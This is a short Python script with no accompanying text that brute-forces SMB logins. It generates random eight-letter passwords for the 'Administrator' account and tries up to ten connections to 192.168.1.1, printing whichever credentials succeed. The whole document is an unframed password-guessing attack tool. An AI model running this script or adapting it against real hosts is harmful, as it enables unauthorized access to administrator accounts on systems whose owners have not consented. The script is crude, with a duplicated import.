
import random
from smb.SMBConnection import SMBConnection
import random

def generate_credentials():
    username = 'Administrator'
    password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    return username, password

def attempt_connection():
    username, password = generate_credentials()
    try:
        SMBConnection(remote_name='test', username=username, password=password, my_name='veda').connect(ip='192.168.1.1')
        print(f'Successful connection with credentials: {username}:{password}')
        return True   
    except Exception as e:
        print(f'Failed connection with credentials: {username}:{password}, {e}')
        return False

for i in range(10):
    if attempt_connection():
        break
